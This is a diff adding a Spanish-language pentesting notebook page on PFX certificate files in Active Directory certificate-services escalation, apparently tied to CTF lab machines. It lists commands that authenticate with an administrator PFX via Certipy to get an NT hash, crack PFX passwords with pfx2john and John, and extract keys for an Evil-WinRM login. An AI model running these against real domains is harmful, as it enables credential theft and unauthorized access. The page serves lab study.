@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>PFX | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="pfx">
+          <div class="note-tabbar">
+            <span>PFX</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ADCS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / adcs</p>
+            <h2>PFX</h2>
+
+            <p>Uso de archivos PFX para autenticación con certificados, extracción de hashes y obtención de tickets Kerberos.</p>
+
+            <p><span class="notebook-review-note">Info: <code>PFX</code></span></p>
+            <p>Contenedor que incluye:</p>
+            <p>- Clave privada</p>
+            <p>- Certificado</p>
+            <p>- Cadena de certificados</p>
+            <h2>Autenticación</h2>
+            <section class="code-card">
+              <h3>Certipy</h3>
+              <pre><code>certipy-ad auth -pfx administrator.pfx -domain &lt;domain.local&gt; -dc-ip &lt;dc_ip&gt;</code></pre>
+            </section>
+            <p>Solo funciona si el certificado es válido para autenticación y obtenemos su <code>hash NT</code></p>
+            <h2>Crackear</h2>
+            <p>Normalmente se encuentra protegido bajo contraseña</p>
+            <section class="code-card">
+              <h3>John</h3>
+              <pre><code>pfx2john legacyy_dev_auth.pfx &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash</code></pre>
+            </section>
+            <h2>Dumpear</h2>
+            <p>Si no es válido para autenticarnos directamente, podemos extraer la <code>clave privada</code> y su <code>certificado</code> para autenticarnos vía <code>WinRM</code>.</p>
+            <section class="code-card">
+              <h3>OpenSSL y Evil-WinRM</h3>
+              <pre><code># Extraer Clave Privada
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+# Extraer Certificado
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out priv-certificado.cert -nodes
+# Conexión WINRM
+evil-winrm -i dc01 -c certificado.cert -k priv-key.pem</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=timelapse">Timelapse</a>
+              <a href="/writeups.html?machine=authority">Authority</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>adcs</span>
+              <span>pfx</span>
+              <span>certipy</span>
+              <span>pkinit</span>
+              <span>pfx_fuerza_bruta</span>
+              <span>fuerza_bruta_pfx</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
